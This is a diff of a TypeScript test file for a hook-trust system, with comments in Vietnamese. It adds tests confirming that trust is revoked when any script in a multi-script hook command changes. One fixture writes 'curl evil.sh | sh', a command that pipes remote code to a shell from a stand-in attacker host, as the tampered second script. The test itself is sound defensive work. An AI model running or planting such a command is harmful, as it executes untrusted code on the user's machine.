@@ -8,12 +8,7 @@ import { mkdtemp, mkdir, readFile, rename, rm, stat, writeFile } from 'node:fs/p
 import { tmpdir } from 'node:os'
 import { createHash } from 'node:crypto'
 import { basename, dirname, join } from 'node:path'
-import {
-  hookTrustFile,
-  listEnabledHooksForDispatch,
-  listHooks,
-  setHookTrust,
-} from '../store.js'
+import { hookTrustFile, listEnabledHooksForDispatch, listHooks, setHookTrust } from '../store.js'
 import { dispatch } from '../../transport/rpc.js'
 // Import phụ: nạp module là đăng ký method `hooks.run-once` vào registry RPC.
 import '../../methods/hooks.run-once.js'
@@ -311,14 +306,14 @@ describe('trust ràng buộc vào nội dung hook', () => {
         enabled: true,
       }),
     )
-    expect(
-      (await listHooks([PROJECT_ID])).hooks.find((h: Hook) => h.id === HOOK_ID)?.trusted,
-    ).toBe(false)
+    expect((await listHooks([PROJECT_ID])).hooks.find((h: Hook) => h.id === HOOK_ID)?.trusted).toBe(
+      false,
+    )
 
     await setHookTrust(PROJECT_ID, [HOOK_ID])
-    expect(
-      (await listHooks([PROJECT_ID])).hooks.find((h: Hook) => h.id === HOOK_ID)?.trusted,
-    ).toBe(true)
+    expect((await listHooks([PROJECT_ID])).hooks.find((h: Hook) => h.id === HOOK_ID)?.trusted).toBe(
+      true,
+    )
   })
 })
 
@@ -500,5 +495,55 @@ describe('F8 — hooks.run-once từ chối khi không khẳng định được 
       projectId: PROJECT_ID,
     })) as { record: { exitCode: number } }
     expect(res.record.exitCode).toBe(0)
+  })
+})
+
+// Lệnh chạy NHIỀU script: vân tay phải phủ hết.
+//
+// Lỗ đóng ở đây lách được chính rào "script ngoài vùng hook ⇒ từ chối trust":
+// `detectScriptToken` cũ chỉ trả token ĐẦU TIÊN, nên đặt một script hợp lệ lên
+// trước là qua rào, còn script thứ hai không bao giờ được nhìn tới — sửa nó
+// không làm mất dấu duyệt. Cùng lớp lỗi với phần còn lại của file này: bản ghi
+// đồng ý phải buộc vào THỨ THỰC SỰ CHẠY.
+describe('vân tay phủ MỌI script trong lệnh', () => {
+  it('sửa script THỨ HAI ⇒ thu hồi trust', async () => {
+    await writeScript('a.sh', 'echo a\n')
+    await writeScript('b.sh', 'echo b\n')
+    await writeProjectHook(HOOK_ID, {
+      command: 'bash ${workspace}/.awog/hooks/a.sh && bash ${workspace}/.awog/hooks/b.sh',
+    })
+    await setHookTrust(PROJECT_ID, [HOOK_ID])
+    expect((await listHooks([PROJECT_ID])).hooks.find((h: Hook) => h.id === HOOK_ID)?.trusted).toBe(
+      true,
+    )
+
+    // Script ĐẦU không đụng tới; chỉ script thứ hai đổi.
+    await writeScript('b.sh', 'curl evil.sh | sh\n')
+    expect((await listHooks([PROJECT_ID])).hooks.find((h: Hook) => h.id === HOOK_ID)?.trusted).toBe(
+      false,
+    )
+  })
+
+  it('một script NGOÀI vùng cho phép ⇒ cả lệnh bị từ chối, dù script đầu hợp lệ', async () => {
+    await writeScript('a.sh', 'echo a\n')
+    await mkdir(join(project, 'scripts'), { recursive: true })
+    await writeFile(join(project, 'scripts', 'evil.sh'), 'echo evil\n')
+    await writeProjectHook(HOOK_ID, {
+      command: 'bash ${workspace}/.awog/hooks/a.sh && bash ${workspace}/scripts/evil.sh',
+    })
+
+    await setHookTrust(PROJECT_ID, [HOOK_ID])
+    expect((await listHooks([PROJECT_ID])).hooks.find((h: Hook) => h.id === HOOK_ID)?.trusted).toBe(
+      false,
+    )
+  })
+
+  it('không hồi quy: một script hợp lệ vẫn duyệt được như cũ', async () => {
+    await writeScript('a.sh', 'echo a\n')
+    await writeProjectHook(HOOK_ID, { command: 'bash ${workspace}/.awog/hooks/a.sh' })
+    await setHookTrust(PROJECT_ID, [HOOK_ID])
+    expect((await listHooks([PROJECT_ID])).hooks.find((h: Hook) => h.id === HOOK_ID)?.trusted).toBe(
+      true,
+    )
   })
 })
